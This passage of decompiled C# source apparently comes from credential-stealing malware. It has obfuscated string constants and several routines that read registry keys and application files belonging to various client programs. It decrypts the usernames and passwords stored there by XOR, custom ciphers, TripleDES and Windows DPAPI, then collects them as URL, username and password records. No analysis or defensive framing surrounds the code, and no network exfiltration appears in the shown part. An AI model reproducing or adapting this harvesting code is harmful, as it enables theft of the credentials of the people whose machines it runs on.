			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> UDQ()
	{
		//Discarded unreachable code: IL_019a, IL_01ad
		//IL_01a4: Expected O, but got I4
		//IL_01a5: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			string name = O.I("C/i2TRTbZiqL7HdjOiEj3FYATGE6zxl4N+U554wYWkDKpvXgtyeLw2ByHu2g21xm");
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name))
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name2 in subKeyNames)
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
					{
						if (registryKey2 == null)
						{
							continue;
						}
						string text = Conversions.ToString(registryKey2.GetValue(O.I("XOYrq/fsuGitF3gjHZ6ZLA==")));
						if (!string.IsNullOrEmpty(text))
						{
							string text2 = Conversions.ToString(registryKey2.GetValue(O.I("7yxTuFw2mR1rvhoc/nix/A==")));
							string text3 = VSD.IH(text2, Conversions.ToString(registryKey2.GetValue(O.I("zC6rDcYSQtGl61RYawCHyg=="))), text);
							string text4 = Conversions.ToString(registryKey2.GetValue(O.I("K2gRXF49t2m+N/iIki14vg==")));
							text = Conversions.ToString(Operators.AddObject(text, Operators.AddObject(O.I("Zul69qgSPOrMMuGqrF6sew=="), registryKey2.GetValue(O.I("TOr6hTilmAf03oSozBCM/g=="), O.I("aSparhKfwetOqfMyYtPVWw==")))));
							if (string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
							{
								text3 = string.Format(O.I("GTwoavASMA8M6sOgB0tjaA5ZyTN2Afqgsk46EU58aR8="), Uri.UnescapeDataString(text4));
							}
							JK jK = new JK();
							jK.WE_114 = text;
							jK.ECS_112 = text2;
							jK.GA_113 = text3;
							jK.NP_115 = O.I("JbMr3jv7OJBad9CJj1oMTg==");
							list.Add(jK);
						}
					}
				}
			}
			return list;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			List<JK> result = list;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> KJ()
	{
		//Discarded unreachable code: IL_0176, IL_0189
		//IL_0180: Expected O, but got I4
		//IL_0181: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			string text = Strings.Replace(Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")), Interaction.Environ(O.I("EekanRbpJE/Z2AZd4BViNQ==")), O.I("z7x++Qdj8r2IS5ljZdE/WQ==")) + O.I("Ujznm6eDZuoa17LyDAdYLnk1qhU2nMKGITvEe2Klu4s=");
			if (!File.Exists(text))
			{
				return new List<JK>();
			}
			string rW__ = S_.TG(text);
			string str = S_.RU(rW__, O.I("olpcQNSZFZGWAaCsSCtSgg=="), O.I("DPidYWtSqCMwGKLiwQEQPw=="));
			string str2 = S_.RU(rW__, O.I("AmL6nDLW8MJ2xZ/1IGnCPA=="), O.I("DPidYWtSqCMwGKLiwQEQPw=="));
			string text2 = S_.RU(rW__, O.I("nw3WgWJ931Ad6MtsKEKx7w=="), O.I("DPidYWtSqCMwGKLiwQEQPw=="));
			string password = S_.RU(rW__, O.I("fXMiJzEMM5AVPcxU7l9RGA=="), O.I("DPidYWtSqCMwGKLiwQEQPw=="));
			string text3 = S_.RU(rW__, O.I("fwMjkuiWkQrDaxxM2Y9/7A=="), O.I("DPidYWtSqCMwGKLiwQEQPw=="));
			if (Operators.CompareString(text2, "", false) != 0)
			{
				try
				{
					JK jK = new JK();
					jK.WE_114 = str + O.I("Zul69qgSPOrMMuGqrF6sew==") + str2;
					jK.ECS_112 = text2;
					jK.GA_113 = password;
					jK.NP_115 = O.I("nt6+NgyRL+castjh2R6MzQ==");
					list.Add(jK);
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
					return list;
				}
			}
			return list;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static string UON(string WNU_240)
	{
		//Discarded unreachable code: IL_0059, IL_006c
		//IL_0063: Expected O, but got I4
		//IL_0064: Expected O, but got I4
		string text = "";
		try
		{
			int i = 0;
			for (int length = WNU_240.Length; i < length; i = checked(i + 1))
			{
				char @string = WNU_240[i];
				text += Conversions.ToString(Strings.Chr(Strings.Asc(@string) ^ 0x19));
			}
			return text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return text;
		}
	}

	internal static List<JK> BC_()
	{
		//Discarded unreachable code: IL_0172, IL_0185
		//IL_017c: Expected O, but got I4
		//IL_017d: Expected O, but got I4
		string path = Environment.GetEnvironmentVariable(O.I("e370YubJ9+XbFfZjMSxbBg==")) + O.I("8EPTbx7Ub13fqP7xA1qIH3KlFUgtkgkCT25znyosprs=");
		List<JK> list = new List<JK>();
		string uRL = string.Empty;
		string userName = string.Empty;
		string password = string.Empty;
		string[] array = File.ReadAllLines(path);
		string[] array2 = array;
		foreach (string text in array2)
		{
			string[] array3 = text.Split(';');
			string[] array4 = array3;
			foreach (string text2 in array4)
			{
				string[] array5 = text2.Split('=');
				if (Operators.CompareString(array5[0], O.I("AlxNNqc+qVhVWuM20hoSuw=="), false) == 0)
				{
					uRL = array5[1];
				}
				else if (Operators.CompareString(array5[0], O.I("zC6rDcYSQtGl61RYawCHyg=="), false) == 0)
				{
					string text3 = array5[1];
					password = ((text3.Length <= 2) ? O.I("DtybrW5THxF887FZnQSYJw==") : UON(text3));
				}
				else if (Operators.CompareString(array5[0], O.I("B6UJuSMiPSa02PYTuv9Jcg=="), false) == 0)
				{
					userName = array5[1];
				}
			}
			JK jK = new JK();
			jK.WE_114 = uRL;
			jK.ECS_112 = userName;
			jK.GA_113 = password;
			jK.NP_115 = O.I("ytdDmPs80bZfLaw5234ddQ==");
			list.Add(jK);
		}
		return list;
	}

	internal static List<JK> CM()
	{
		//Discarded unreachable code: IL_0343, IL_0356
		//IL_034d: Expected O, but got I4
		//IL_034e: Expected O, but got I4
		string text = "";
		List<JK> list = new List<JK>();
		string text2 = "";
		string text3 = "";
		string uRL = "";
		checked
		{
			try
			{
				string path = ((Interaction.Environ(O.I("5pzZgrH355snScLnNsQFMhwxswIrafhQle4CKgBv7IU=")) != null) ? (Interaction.Environ(O.I("D4tq+m8FZUHRz2WjnzWc969vl55KC9nVW0oezLsQtdc=")) + O.I("C54jRUhshnHyI070IuTpM4W/hBgjatIquA71jHSTUh+jvv0WyzFXXfBcQ/pgSz+F")) : (Interaction.Environ(O.I("x1kg2TQeUSPs+NbEjXELyg==")) + O.I("C54jRUhshnHyI070IuTpM4W/hBgjatIquA71jHSTUh+jvv0WyzFXXfBcQ/pgSz+F")));
				if (!File.Exists(path))
				{
					return null;
				}
				string text4 = O.I("XwRXcpYj9qpypbRPZW9ELV7tLrcvwaw9YurRpU0MsYd6eaUPWh1gahEIvMCoA2sn");
				string[] array = File.ReadAllLines(path);
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (!array[i].Contains(text4))
					{
						continue;
					}
					string text5 = array[i].Substring(text4.Length - 1).Substring(1, array[i].Length - (text4.Length + 1 + 3));
					int num2 = text5.Length - 1;
					for (int j = 0; j <= num2; j += 2)
					{
						text += Conversions.ToString(Strings.Chr(Conversions.ToInteger(O.I("mJsSWcDqDy3MlAysop6B+g==") + text5.Substring(j, 2))));
					}
					text5 = "";
					string[] array2 = text.Split('\0');
					int num3 = array2.Length - 1;
					for (int k = 0; k <= num3; k++)
					{
						int num4 = 1;
						do
						{
							array2[k] = array2[k].Replace(Conversions.ToString(Strings.Chr(num4)), "");
							num4++;
						}
						while (num4 <= 31);
						array2[k] = array2[k].Replace(Conversions.ToString(Strings.Chr(255)), "");
						if (Operators.CompareString(array2[k], "", false) != 0)
						{
							text5 = text5 + O.I("DPidYWtSqCMwGKLiwQEQPw==") + array2[k];
						}
					}
					string[] array3 = text5.ToString().Split('\r');
					int num5 = array3.Length - 2;
					for (int l = 0; l <= num5; l++)
					{
						if (array3[l].EndsWith(O.I("RiQ6TTso7EcPKdNnxi3Ehg==")) & (array3[l].IndexOf(O.I("D7TesGVc8sp0Ymc2v65Wtg==")) > 0))
						{
							uRL = array3[l].Substring(0, array3[l].Length - 2);
						}
						if (array3[l].EndsWith(O.I("KJM4FVxsnV+btL0NDweN3g==")) & array3[l + 1].EndsWith(O.I("uZSSJzDQhislC+TtJy2t3w==")))
						{
							text3 = array3[l].Substring(0, array3[l].Length - 1);
							text2 = array3[l + 1].Substring(0, array3[l + 1].Length - 2);
							JK jK = new JK();
							if (text3.Length > 4)
							{
								jK.WE_114 = uRL;
								jK.ECS_112 = text2;
								jK.GA_113 = text3;
								jK.NP_115 = O.I("xhll22cGTxDLc3kmUQrHOw==");
								list.Add(jK);
							}
						}
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> FDL()
	{
		//Discarded unreachable code: IL_029c, IL_02af
		//IL_02a6: Expected O, but got I4
		//IL_02a7: Expected O, but got I4
		List<JK> list = new List<JK>();
		checked
		{
			try
			{
				char[] array = S_.NTZ().ToCharArray();
				RegistryKey currentUser = Registry.CurrentUser;
				string text = "";
				currentUser = Registry.CurrentUser.OpenSubKey(O.I("DU8nI9MD5qMha7JoVkg2hNKLT/lguhovPUAHiQyis/4="));
				string[] subKeyNames = currentUser.GetSubKeyNames();
				currentUser.Close();
				string[] array2 = subKeyNames;
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				foreach (string text2 in array2)
				{
					string text3 = Conversions.ToString(Registry.GetValue(O.I("kwTbWGPthx54z7ItP6ZZgEcrL9vpqQTqPJpv8K5ahZReJTRvbtNjFRYVpgMtLudw") + text2, O.I("pldWt8Z+E6IgXewVPmzq+g=="), ""));
					char[] array3 = text3.ToCharArray();
					string[] array4 = new string[(int)Math.Round((double)text3.Length / 4.0) + 1];
					while (num <= Information.UBound(array3) - 4)
					{
						if (num < Information.UBound(array3) - 4)
						{
							array4[num2] = Conversions.ToString(array3[num]) + Conversions.ToString(array3[num + 1]) + Conversions.ToString(array3[num + 2]);
						}
						num += 4;
						num2++;
					}
					string text4 = "";
					string text5 = text2;
					int j = 0;
					for (int length = text5.Length; j < length; j++)
					{
						char value = text5[j];
						text4 += Conversions.ToString(value);
						if (num3 <= Information.UBound(array))
						{
							text4 += Conversions.ToString(array[num3]);
						}
						num3++;
					}
					text4 = text4 + text4 + text4;
					char[] array5 = text4.ToCharArray();
					string str = "";
					str += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text4.Substring(text4.Length - 1, 1)))));
					int num4 = Information.UBound(array4);
					for (int k = 1; k <= num4; k++)
					{
						if (array4[k] != null)
						{
							char value2 = Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[k]) - (double)k - (double)Strings.Asc(array5[k - 1]) - 122.0));
							str += Conversions.ToString(value2);
						}
					}
					JK jK = new JK();
					jK.WE_114 = O.I("rFvd81zXKGfKdmAhZNnXN5Y0qSAMST7LFxwGo8TH0kA=");
					jK.ECS_112 = text2;
					jK.GA_113 = str;
					jK.NP_115 = O.I("U38bix/5MUL5alvO6uHsAA==");
					list.Add(jK);
				}
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> GMF()
	{
		//Discarded unreachable code: IL_0145, IL_0158
		//IL_014f: Expected O, but got I4
		//IL_0150: Expected O, but got I4
		List<JK> list = new List<JK>();
		checked
		{
			try
			{
				string path = Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("uS+VUL8+TSyneURyRykWQZOnYhn6NWqDhsMtEJ+Pk9o=");
				if (!File.Exists(path))
				{
					return new List<JK>();
				}
				string text = File.ReadAllText(Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("uS+VUL8+TSyneURyRykWQZOnYhn6NWqDhsMtEJ+Pk9o="));
				int count = Regex.Matches(text, Regex.Escape(O.I("r92/HflmQzxlhm+TXfSLqA=="))).Count;
				int num = count - 1;
				for (int i = 0; i <= num; i++)
				{
					string uRL = AR(text, O.I("acJQ1UczAVJYph1GDq7qRg=="), O.I("a19PEd/XbR9PMVXgcCadLA=="), i);
					string userName = AR(text, O.I("BBmcSOGCdavq6X3JcD4Jbw=="), O.I("0/lALs+uFU2BqXFm3lri8Q=="), i);
					string password = AR(text, O.I("qt+W5ewmfS0PpsdbzKzlug=="), O.I("GqgeQjQTrjPd/PfUjLaejw=="), i);
					JK jK = new JK();
					jK.WE_114 = uRL;
					jK.ECS_112 = userName;
					jK.GA_113 = password;
					jK.NP_115 = O.I("sNqQUJw3e52hZoMf5igbUA==");
					list.Add(jK);
				}
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> XN()
	{
		//Discarded unreachable code: IL_0179, IL_018c
		//IL_0183: Expected O, but got I4
		//IL_0184: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			string text = Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("RPXruGRT9PgEwv3+vKGP71Ak/3sAUzkvjs4/NaeG7YajrG090hZHK92CNAYLaVlA") + FileSystem.Dir(Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("3JyTJ9FS4WyZ2QjQRZ5Ycz//lQ0Lh354WbLAaHzF+vyrdq/CIu2nboOvTnUGLJVb"));
			if (!File.Exists(text))
			{
				return new List<JK>();
			}
			string rW__ = S_.TG(text);
			string str = S_.RU(rW__, O.I("eSLzT5bWAI4pepHHS3aL3w=="), O.I("jcRK2xC2ickW2RbMCKOuiA=="));
			string str2 = S_.RU(rW__, O.I("oBts3CYgATcO/RL+AbBpmQ=="), O.I("fvEKWhyB2AJ/kqVyJxjn/A=="));
			string text2 = S_.RU(rW__, O.I("Gy5Z2MmkKPmp/IyFwu5LEA=="), O.I("vKmf71976sGkcCs1+gTgOA=="));
			string password = S_.RU(rW__, O.I("/xM4C1VOHRzdoan+cwj/MQ=="), O.I("prD4xqYDT5z3l+Y7LHNokw=="));
			string text3 = S_.RU(rW__, O.I("TJIectBY5Yvtn/lm4dOLoA=="), O.I("W6hjYGqB4m94sG9MxfgL3g=="));
			if (Operators.CompareString(text2, "", false) != 0)
			{
				try
				{
					JK jK = new JK();
					jK.WE_114 = str + O.I("Zul69qgSPOrMMuGqrF6sew==") + str2;
					jK.ECS_112 = text2;
					jK.GA_113 = password;
					jK.NP_115 = O.I("qFxqq3TB94tTvYcfJxsAZg==");
					list.Add(jK);
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
					return list;
				}
			}
			return list;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> SV()
	{
		//Discarded unreachable code: IL_0296, IL_02a6, IL_02b9
		//IL_02b0: Expected O, but got I4
		//IL_02b1: Expected O, but got I4
		List<JK> list = new List<JK>();
		string text = "";
		ZP zP = new ZP();
		if (File.Exists(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("h339MAefDMS+zwaIjbwLm5LxGryJnPu4Nsr6DcrqjnukgU5j1LknZwFVbVc2OzbU")))
		{
			zP.Load(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("h339MAefDMS+zwaIjbwLm5LxGryJnPu4Nsr6DcrqjnukgU5j1LknZwFVbVc2OzbU"));
			try
			{
				foreach (string key in zP.Keys)
				{
					JK jK = new JK();
					foreach (string key2 in zP[key].Keys)
					{
						if (Operators.CompareString(key2, O.I("UaJTb65SpwVkGWYx01TNlw=="), false) == 0)
						{
							jK.WE_114 = zP[key][key2].Replace(O.I("J4TYpBNSFoaeSq6MjuzO4g=="), "");
						}
						else if (Operators.CompareString(key2, O.I("0Zkb1XFZdgGz4+mFZIs1Lw=="), false) == 0)
						{
							if (zP[key][key2] != null)
							{
								jK.ECS_112 = zP[key][key2].Replace(O.I("J4TYpBNSFoaeSq6MjuzO4g=="), "");
							}
						}
						else if (Operators.CompareString(key2, O.I("uyvfMnAzQvgOw4Zq7ioCoQ=="), false) == 0 && Operators.CompareString(zP[key][key2], "", false) != 0)
						{
							string text2 = SA(zP[key][key2].Replace(O.I("J4TYpBNSFoaeSq6MjuzO4g=="), ""));
							if (Operators.CompareString(text2, null, false) != 0)
							{
								string text3 = text2;
								int i = 0;
								for (int length = text3.Length; i < length; i = checked(i + 1))
								{
									char c = text3[i];
									if (c == '\0')
									{
										break;
									}
									text += Conversions.ToString(c);
								}
							}
							else
							{
								text = JYQ(zP[key][key2]);
							}
							jK.GA_113 = text;
							text = "";
						}
						jK.NP_115 = O.I("A3g66+rfLPpdgQljPjIQ8g==");
					}
					if ((Operators.CompareString(jK.ECS_112, "", false) != 0) & (Operators.CompareString(jK.GA_113, "", false) != 0))
					{
						list.Add(jK);
					}
				}
				return list;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return list;
			}
		}
		return new List<JK>();
	}

	internal static string JYQ(string JQ_241)
	{
		//Discarded unreachable code: IL_01b6, IL_01c9
		//IL_01c0: Expected O, but got I4
		//IL_01c1: Expected O, but got I4
		checked
		{
			try
			{
				object instance = JQ_241;
				if (!JQ_241.Contains(O.I("7T+YIJrRJwcp9twyKLqbHQ==")))
				{
					instance = Convert.ToString(O.I("7T+YIJrRJwcp9twyKLqbHQ==")) + JQ_241;
				}
				object obj = "";
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, O.I("BvYEfS5WguySRVl36PmRoQ=="), new object[2]
				{
					37,
					Operators.SubtractObject(NewLateBinding.LateGet(instance, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null), 37)
				}, null, null, null));
				int num = Conversions.ToInteger(Operators.SubtractObject(Operators.DivideObject(NewLateBinding.LateGet(objectValue, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null), 2), 1));
				for (int i = 0; i <= num; i++)
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, O.I("BvYEfS5WguySRVl36PmRoQ=="), new object[2]
					{
						i * 2,
						2
					}, null, null, null));
					object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, O.I("BvYEfS5WguySRVl36PmRoQ=="), new object[2]
					{
						5 + i,
						6 + i - (5 + i)
					}, null, null, null));
					int charCode = Convert.ToInt32(Conversions.ToString(objectValue2), 16) - i - 1 - unchecked(checked(47 + Convert.ToInt32(Conversions.ToString(objectValue3), 16)) % 57);
					obj = Operators.AddObject(obj, Strings.ChrW(charCode));
				}
				return Conversions.ToString(obj);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = O.I("Ddm6/1Q7wdvglNPXcQOURJAx1nBmhRlrH9lamYWitXY=");
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static string SA(string XOQ_242)
	{
		//Discarded unreachable code: IL_011f, IL_0132
		//IL_0129: Expected O, but got I4
		//IL_012a: Expected O, but got I4
		object value = XOQ_242;
		if (XOQ_242[0] == '_')
		{
			value = XOQ_242.Substring(1);
		}
		try
		{
			byte[] array = Convert.FromBase64String(Conversions.ToString(value));
			object instance = new TripleDESCryptoServiceProvider();
			NewLateBinding.LateSet(instance, null, O.I("sQmakSi2466ZH+vCDBuFLQ=="), new object[1]
			{
				HW_116
			}, null, null);
			NewLateBinding.LateSet(instance, null, O.I("ijH8cuhbPViAWCp8fCHnDA=="), new object[1]
			{
				CipherMode.CBC
			}, null, null);
			NewLateBinding.LateSet(instance, null, O.I("KRq3LT8gIt27jFOdnIQmrg=="), new object[1]
			{
				PEA_117
			}, null, null);
			NewLateBinding.LateSet(instance, null, O.I("GTW4TM6QWYJjlOovmnXT9w=="), new object[1]
			{
				PaddingMode.None
			}, null, null);
			ICryptoTransform cryptoTransform = (ICryptoTransform)NewLateBinding.LateGet(instance, null, O.I("SwcHqu5QjzdChH8blk8/+g=="), new object[0], null, null, null);
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			object @string = Encoding.UTF8.GetString(bytes);
			return Conversions.ToString(@string);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> OK()
	{
		//Discarded unreachable code: IL_0158, IL_016b
		//IL_0162: Expected O, but got I4
		//IL_0163: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			string text = Strings.Replace(S_.DD(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNGJ2Z/TSLTLvt6taW2Xds5LkAHUvsO+byH2iIgfog7YNjZs2QCymmu+rIadLa8pMgXOgXElb2KVtzjsNq+0pHvw==")), O.I("4ivkbeJ9sgbeTFUwb9ovvg=="), null) + O.I("Xaf1tcvVkaMcgkfaJ6nWRA==");
			if (!File.Exists(text))
			{
				return new List<JK>();
			}
			string rW__ = S_.OME(text, -1);
			string uRL = S_.RU(rW__, O.I("eFV1VfEd6xJ9MfE6jM2sDg=="), O.I("8chSvIB3tqT42N+5XTUZWg=="));
			string text2 = S_.RU(rW__, O.I("8chSvIB3tqT42N+5XTUZWg=="), O.I("Rw5qrGHNHx3utH8xzcn/zw=="));
			string text3 = S_.RU(rW__, O.I("V0k5FDQVlrDvC7LnXaO6aw=="), O.I("5TM0rorFAHFFy6PpLK6wsA=="));
			string password = S_.RU(rW__, O.I("Rw5qrGHNHx3utH8xzcn/zw=="), O.I("V0k5FDQVlrDvC7LnXaO6aw=="));
			string text4 = S_.RU(rW__, O.I("CR49pgy7RFAUPFPfLCkMmw=="), O.I("eFV1VfEd6xJ9MfE6jM2sDg=="));
			if (Operators.CompareString(text3, "", false) != 0)
			{
				try
				{
					JK jK = new JK();
					jK.WE_114 = uRL;
					jK.ECS_112 = text3;
					jK.GA_113 = password;
					jK.NP_115 = O.I("mUMDGnHXjjSFbZXgUKY/pA==");
					list.Add(jK);
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
					return list;
				}
			}
			return list;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> WQA()
	{
		//Discarded unreachable code: IL_0173, IL_0186
		//IL_017d: Expected O, but got I4
		//IL_017e: Expected O, but got I4
		List<JK> list = new List<JK>();
		string keyName = O.I("K0ocYJdpSlFAvhxHrgztFahe78Xf+Ce7A2HQAcS75WPIs72M8f14WC3YQPpfbd7M");
		string keyName2 = O.I("kwTbWGPthx54z7ItP6ZZgDcDY6ebmwqnETMDtOwvYVLh2RoLSrlKXKFV9i26r3TA");
		try
		{
			string text = Conversions.ToString(Registry.GetValue(keyName, O.I("u5AYAU3ZI32x4F6gTmCQAA=="), ""));
			string kP_ = Conversions.ToString(Registry.GetValue(keyName, O.I("zC6rDcYSQtGl61RYawCHyg=="), ""));
			string text2 = Conversions.ToString(Registry.GetValue(keyName2, O.I("7yxTuFw2mR1rvhoc/nix/A=="), ""));
			string kP_2 = Conversions.ToString(Registry.GetValue(keyName2, O.I("zC6rDcYSQtGl61RYawCHyg=="), ""));
			if ((Operators.CompareString(text, "", false) == 0) & (Operators.CompareString(text2, "", false) == 0))
			{
				return null;
			}
			if (Operators.CompareString(text, "", false) != 0)
			{
				JK jK = new JK();
				jK.WE_114 = O.I("CGdc9wAphv+yegXM6dfD29Q9evE+UWL03OZstvZK0ps=");
				jK.ECS_112 = text;
				jK.GA_113 = JHC(kP_);
				jK.NP_115 = O.I("1KSKWvcccUG5bNxv9DLMmg==");
				list.Add(jK);
				return list;
			}
			JK jK2 = new JK();
			jK2.WE_114 = O.I("CGdc9wAphv+yegXM6dfD29Q9evE+UWL03OZstvZK0ps=");
			jK2.ECS_112 = text2;
			jK2.GA_113 = JHC(kP_2);
			jK2.NP_115 = O.I("1KSKWvcccUG5bNxv9DLMmg==");
			list.Add(jK2);
			return list;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static string VIL(string CO__243)
	{
		//Discarded unreachable code: IL_010b, IL_011e
		//IL_0115: Expected O, but got I4
		//IL_0116: Expected O, but got I4
		if (CO__243.Length % 4 != 0)
		{
			return O.I("q3BuWKbz9UVM0vwJiV+jQRXejtQPS1CT8/kIbqn6QiOCVTv2hNAcIQMW+Eyii3zr");
		}
		byte[] array = new byte[1024];
		int num = 0;
		int num2 = 0;
		checked
		{
			while (num2 < CO__243.Length)
			{
				int num3 = 0;
				int num4 = 0;
				do
				{
					char value = CO__243[num2];
					num2++;
					int num5 = O.I("a0lze3YgEKKbU2djGfsLpN7Tpux49xAQvUyxNlVOF0jH7F2h1BtPnhXsgTkeyku9r7c5DmFGRlFd4ubI4DpzkjKi5HXopF9IIqcd4uHd4z0=").IndexOf(value);
					if (num5 < 0)
					{
						return O.I("bCYODUbmaK6pHNkzHVJVYkuPCbsbMNeZbQ+RMWL1lBpPhjBKR4pU+WQFxchEoIVN") + Conversions.ToString(unchecked((int)value)) + O.I("Tzqlcrb3kry8ZHgj4xztKQ==");
					}
					num3 = (num3 << 6) + num5;
					num4++;
				}
				while (num4 <= 3);
				array[num] = (byte)((num3 >> 16) & 0xFF);
				num++;
				array[num] = (byte)((num3 >> 8) & 0xFF);
				num++;
				array[num] = (byte)(num3 & 0xFF);
				num++;
			}
			byte[] array2 = LU(array);
			string text = "";
			int num6 = array2.Length;
			while (num6 > 4)
			{
				num6--;
				text += Conversions.ToString(Strings.ChrW(array2[num6] ^ 0x5A));
			}
			return text;
		}
	}

	internal static byte[] LU(byte[] IQO_244)
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		checked
		{
			if (IQO_244.Length > 1)
			{
				int num = IQO_244.Length - 1;
				while (IQO_244[num] == 0)
				{
					num--;
				}
				byte[] array = new byte[num + 1 - 1 + 1];
				int num2 = num + 1 - 1;
				for (int i = 0; i <= num2; i++)
				{
					array[i] = IQO_244[i];
				}
				return array;
			}
			return new byte[0];
		}
	}

	internal static List<JK> FJ()
	{
		//Discarded unreachable code: IL_01c1, IL_01d4
		//IL_01cb: Expected O, but got I4
		//IL_01cc: Expected O, but got I4
		List<JK> list = new List<JK>();
		string userName = "";
		string password = "";
		checked
		{
			if (Directory.Exists(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("8/vcjxIlsxdXe0mZcB9HuA==")))
			{
				string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("8/vcjxIlsxdXe0mZcB9HuA=="));
				try
				{
					int num = directories.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						if (!File.Exists(directories[i] + O.I("EjxaTG1zjv6+QPiF4geNkQ==")))
						{
							continue;
						}
						string[] array = File.ReadAllLines(directories[i] + O.I("EjxaTG1zjv6+QPiF4geNkQ=="));
						string expression = array[array.Length - 1];
						string[] array2 = Strings.Split(expression, O.I("L7w2JUo4qh4f5rdbDpDyiA=="));
						string text = "";
						string text2 = "";
						int num2 = 0;
						string[] array3 = array2;
						foreach (string text3 in array3)
						{
							if (text3 == null)
							{
								continue;
							}
							string text4 = text3.Substring(0, Strings.InStr(text3, O.I("1q+SWZtRAiG6kFDATSWqOw==")));
							if (text4.Length > 2)
							{
								text4 = text4.Replace(O.I("1q+SWZtRAiG6kFDATSWqOw=="), "");
								if (num2 == 0)
								{
									userName = VIL(text4);
									num2++;
								}
								else
								{
									password = VIL(text4);
								}
							}
						}
						JK jK = new JK();
						jK.WE_114 = O.I("q542gy/+wDIUJhH3OGKnNg==");
						jK.ECS_112 = userName;
						jK.GA_113 = password;
						jK.NP_115 = O.I("twEkmIBoXWHvg+/ibjtb1Q==");
						list.Add(jK);
					}
					return list;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					List<JK> result = new List<JK>();
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return list;
		}
	}

	internal static string KNH(byte[] QGX_245)
	{
		//Discarded unreachable code: IL_0047, IL_005a
		//IL_0051: Expected O, but got I4
		//IL_0052: Expected O, but got I4
		checked
		{
			byte[] array = new byte[QGX_245.Length - 2 + 1];
			Buffer.BlockCopy(QGX_245, 1, array, 0, QGX_245.Length - 1);
			string @string = Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser));
			return @string.Replace(Conversions.ToString(Convert.ToChar(0)), "");
		}
	}

